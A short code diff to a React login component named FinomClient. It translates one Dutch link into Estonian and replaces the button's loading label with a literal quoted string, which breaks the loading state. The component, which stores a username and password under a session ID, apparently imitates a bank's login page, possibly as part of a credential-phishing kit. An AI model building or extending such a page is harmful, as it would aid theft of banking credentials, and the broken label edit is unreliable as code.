@@ -110,7 +110,7 @@ export function FinomClient({ sessionId }: { sessionId: string }) {
             </div>
 
             <div className="text-center mt-2 mb-6">
-              <a href="#" className="text-[10px] font-bold text-gray-400 uppercase tracking-widest hover:text-gray-600">Kunt u niet inloggen?</a>
+              <a href="#" className="text-[10px] font-bold text-gray-400 uppercase tracking-widest hover:text-gray-600">Kas te ei saa sisse logida?</a>
             </div>
 
             <button 
@@ -118,7 +118,7 @@ export function FinomClient({ sessionId }: { sessionId: string }) {
               disabled={saving || !username || !password} 
               className="w-full bg-[#1C1C1E] text-white font-semibold py-4 rounded-[12px] hover:bg-black disabled:opacity-70 transition-colors shadow-lg"
             >
-              {saving ? "Laden..." : "Aanmelden"}
+              "Aanmelden"
             </button>
           </form>
 
